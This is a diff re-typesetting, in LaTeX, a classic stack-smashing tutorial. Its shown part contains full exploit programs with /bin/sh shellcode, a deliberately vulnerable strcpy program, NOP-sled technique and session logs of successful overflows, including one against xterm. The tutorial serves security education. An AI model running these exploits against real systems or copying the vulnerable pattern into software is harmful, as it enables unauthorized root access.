@@ -1,6 +1,7 @@
 \documentclass[10pt]{article}
 %\usepackage[paperwidth=8,paperheight=11cm,textwidth=13cm,textheight=14cm,left=0.5cm,right=0.5cm,top=0.5cm,nohead,nofoot]{geometry} 
-\usepackage[paperwidth=10cm,paperheight=13cm,left=0.5cm,right=0.5cm,bottom=0.5cm,top=0.5cm,nohead,nofoot]{geometry} 
+%\usepackage[paperwidth=10cm,paperheight=13cm,left=0.5cm,right=0.5cm,bottom=0.5cm,top=0.5cm,nohead,nofoot]{geometry} 
+\usepackage[papersize={4.5in,6in},margin=0.5cm]{geometry}
 %\usepackage[body={2cm, 5.5in},left=0.2in,right=0.2in,top=0.2in,bottom=0.2in]{geometry}
 
 \parindent=0cm
@@ -973,371 +974,277 @@ the stack will start at the same addres s. Most programs do not push more than a
 bytes into the stack at any one time. Therefore by knowing where  the stack starts we can try to guess where  the 
 buffer we are trying to overflow will be. Here is a little program that will print its stack pointer: 
 
-\begin{comment}
 
-sp.c
-
-unsigned long get_sp(void) {
-
+\begin{lstlisting}[caption=sp.c]
+unsigned long get_sp(void) 
+{
    __asm__("movl %esp,%eax");
-
 }
 
-void main() {
-
+void main() 
+{
   printf("0x%x\n", get_sp());
-
 }
-
+\end{lstlisting}
+\begin{verbatim}
 [aleph1]$ ./sp
-
 0x8000470
-
 [aleph1]$
-
+\end{verbatim}
 Lets assume this is the program we are trying to overflow is: vulnerable.c 
-
-void main(int argc, char *argv[]) {
-
+\begin{lstlisting}[caption=vulnerable.c]
+void main(int argc, char *argv[]) 
+{
   char buffer[512];
 
   if (argc > 1)
-
     strcpy(buffer,argv[1]);
+}
+\end{lstlisting}
+We can create a program that takes as a parameter a buffer size, and an offset from its own stack pointer
+(where we believe the buffer we want to overflow may live). We'll put the overflow string in an environment variable 
+so it is easy to manipulate: 
 
-}We can create a program that takes as a parameter a buffer size, and an offset from its own stack pointer (where 
-
-we believe the buffer we want to overflow may live). We'll put the overflow string in an environment variable so 
-
-it is easy to manipulate: 
-
-exploit2.c
-
+\begin{lstlisting}[caption=exploit2.c,basicstyle=\tiny]
 #include <stdlib.h>
-
 #define DEFAULT_OFFSET                    0
-
 #define DEFAULT_BUFFER_SIZE             512
 
 char shellcode[] =
-
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-
-  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
-
-unsigned long get_sp(void) {
-
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+\end{lstlisting}
+\begin{lstlisting}
+unsigned long get_sp(void) 
+{
    __asm__("movl %esp,%eax");
-
 }
 
-void main(int argc, char *argv[]) {
-
+void main(int argc, char *argv[]) 
+{
   char *buff, *ptr;
-
   long *addr_ptr, addr;
-
   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-
   int i;
 
   if (argc > 1) bsize  = atoi(argv[1]);
-
   if (argc > 2) offset = atoi(argv[2]);
-
-  if (!(buff = malloc(bsize))) {
-
+  if (!(buff = malloc(bsize))) 
+  {
     printf("Can't allocate memory.\n");
-
     exit(0);
-
   }
 
   addr = get_sp() - offset;
-
   printf("Using address: 0x%x\n", addr);
-
   ptr = buff;
-
   addr_ptr = (long *) ptr;
-
   for (i = 0; i < bsize; i+=4)
-
     *(addr_ptr++) = addr;
 
   ptr += 4;
-
   for (i = 0; i < strlen(shellcode); i++)
-
     *(ptr++) = shellcode[i];
 
   buff[bsize - 1] = '\0';
-
   memcpy(buff,"EGG=",4);
-
   putenv(buff);
-
   system("/bin/bash");
-
 }
+\end{lstlisting}
 
-Now we can try to guess what the buffer and offset should be:[aleph1]$ ./exploit2 500
 
+Now we can try to guess what the buffer and offset should be:
+
+\begin{verbatim}
+[aleph1]$ ./exploit2 500
 Using address: 0xbffffdb4
 
 [aleph1]$ ./vulnerable $EGG
-
 [aleph1]$ exit
 
 [aleph1]$ ./exploit2 600
-
 Using address: 0xbffffdb4
 
 [aleph1]$ ./vulnerable $EGG
-
 Illegal instruction
 
 [aleph1]$ exit
 
 [aleph1]$ ./exploit2 600 100
-
 Using address: 0xbffffd4c
 
 [aleph1]$ ./vulnerable $EGG
-
 Segmentation fault
 
 [aleph1]$ exit
 
 [aleph1]$ ./exploit2 600 200
-
 Using address: 0xbffffce8
 
 [aleph1]$ ./vulnerable $EGG
-
 Segmentation fault
 
 [aleph1]$ exit
-
 .
-
 .
-
 .
 
 [aleph1]$ ./exploit2 600 1564
-
 Using address: 0xbffff794
 
 [aleph1]$ ./vulnerable $EGG
-
 $
+\end{verbatim}
 
 As we can see this is not an efficient process. Trying to guess the offset even while knowing where the 
-
 beginning of the stack lives is nearly impossible. We would need at best a hundred tries, and at worst a couple 
-
 of thousand. The problem is we need to guess *exactly* where the address of our code will start. If we are off 
-
 by one byte more or less we will just get a segmentation violation or a invalid instruction. One way to increase 
-
 our chances is to pad the front of our overflow buffer with NOP instructions. Almost all processors have a NOP 
-
 instruction that performs a null operation. It is usually used to delay execution for purposes of timing. We will 
-
 take advantage of it and fill half of our overflow buffer with them. We will place our shellcode at the center, 
-
 and then follow it with the return addresses. If we are lucky and the return address points anywhere in the string 
-
 of NOPs, they will just get executed until they reach our code. In the Intel architecture the NOP instruction is 
-
 one byte long and it translates to 0x90 in machine code. Assuming the stack starts at address 0xFF, that S stands 
-
 for shell code,  and that N stands for a NOP instruction the new stack would look like this: 
 
-bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
-
-memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
-
+{\footnotesize
+\begin{verbatim}
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF  top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF  memory
            buffer                sfp   ret   a     b     c
-
 <------   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
-
                  ^                     |
-
                  |_____________________|
+top of                                                         bottom of
+stack                                                          stack
+\end{verbatim}
+}
 
-top of                                                            bottom of
 
-stack                                                                 stack
+The new exploits is then exploit3.c 
 
-The new exploits is then exploit3.c #include <stdlib.h>
-
+\begin{lstlisting}[caption=exploit3.c]
+#include <stdlib.h>
 #define DEFAULT_OFFSET                    0
-
 #define DEFAULT_BUFFER_SIZE             512
-
 #define NOP                            0x90
 
 char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46"
+"\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+"\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-
-  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
-
-unsigned long get_sp(void) {
-
+unsigned long get_sp(void) 
+{
    __asm__("movl %esp,%eax");
-
 }
 
-void main(int argc, char *argv[]) {
-
+void main(int argc, char *argv[]) 
+{
   char *buff, *ptr;
-
   long *addr_ptr, addr;
-
   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-
   int i;
 
   if (argc > 1) bsize  = atoi(argv[1]);
-
   if (argc > 2) offset = atoi(argv[2]);
 
-  if (!(buff = malloc(bsize))) {
-
+  if (!(buff = malloc(bsize))) 
+  {
     printf("Can't allocate memory.\n");
-
     exit(0);
-
   }
 
   addr = get_sp() - offset;
-
   printf("Using address: 0x%x\n", addr);
-
   ptr = buff;
-
   addr_ptr = (long *) ptr;
 
   for (i = 0; i < bsize; i+=4)
-
     *(addr_ptr++) = addr;
 
   for (i = 0; i < bsize/2; i++)
-
     buff[i] = NOP;
 
   ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
 
   for (i = 0; i < strlen(shellcode); i++)
-
     *(ptr++) = shellcode[i];
 
   buff[bsize - 1] = '\0';
-
   memcpy(buff,"EGG=",4);
-
   putenv(buff);
-
   system("/bin/bash");
-
 }
+\end{lstlisting}
 
 A good selection f or our buffer size is about 100 bytes more than the size of the buffer we are trying to 
-
 overflow. This will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the 
-
 NOPs, but still overwriting the return address with the address we guessed. The buffer we are trying to overflow 
-
 is 512 bytes long, so we'll use 6 12. Let's try to overflow our test program with our new exploit: 
 
+\begin{verbatim}
 [aleph1]$ ./exploit3 612
-
 Using address: 0xbffffdb4[aleph1]$ ./vulnerable $EGG
-
 $
+\end{verbatim}
 
 Whoa! First try! This change has improved our chances a hundredfold. Let's try it now on a real case of a buffer 
-
 overflow. We'll use for our demonstration the buffer overflow on the Xt library. For our example, we'll use 
-
 xterm (all programs linked with the Xt library are vulnerable).  You must be running an X server and allow 
-
 connections to it from the localhost. Set your DISPLAY variable accordingly. 
 
+\begin{verbatim}
 [aleph1]$ export DISPLAY=:0.0
-
 [aleph1]$ ./exploit3 1124
-
 Using address: 0xbffffdb4
 
 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
-
 ^C
-
 [aleph1]$ exit
-
 [aleph1]$ ./exploit3 2148 100
-
 Using address: 0xbffffd48
 
 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
-
 ....
 
 Warning: some arguments in previous message were lost
-
 Illegal instruction
 
 [aleph1]$ exit
-
 .
-
 .
-
 .
 
 [aleph1]$ ./exploit4 2148 600
-
 Using address: 0xbffffb54
 
 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
-
 Warning: some arguments in previous message were lost
-
 bash$
+\end{verbatim}
+
 
 Eureka! Less than a dozen tries and we found the magic numbers. If xterm were installed suid root this would 
-
 now be a root shell. 
 
-Small Buffer Overflows
-
+\subsection{Small Buffer Overflows}
 There wil l be times when  the buffer you are trying to overflow is so small that either the shellcode wont fit into 
-
 it, and it will overwrite the return address with instructions instead of the address of our code, or the number of 
-
 NOPs you can pad the front of the string with is so small that the chances of guessing their address is 
-
 minuscule. To obtain a shell from these programs we will have to go about it another way. This particular 
-
 approach only works when you have access to the program's environment variables. What we will do is place 
-
 our shellcode in an environment variable, and then overflow the buffer with the address of this variable in 
-
 memory. This method also increases your changes of the exploit working as you can make the environment 
-
 variable holding the shell code as large as you want. The environment variables are stored in the top of the stack 
-
 when the program is started, any modification by setenv() are then allocated elsewhere. The stack at the 
-
 beginning then looks like this:
+\begin{comment}
 
 <strings><argv pointers>NULL<envp pointers>NULL<argc><argv>envp> Our new program will take an extra variable, the size of the variable containing the shellcode and NOPs. Our 
 
@@ -1471,7 +1378,7 @@ program has compared with the program you are trying to exploit the guessed addr
 
 high. Experiment both with positive and negative offsets. 
 
-Finding Buffer Overflows
+\subsection{Finding Buffer Overflows}
 
 As stated earlier, buffer overflows are the result of stuffing more information into a buffer than it is meant to 
 
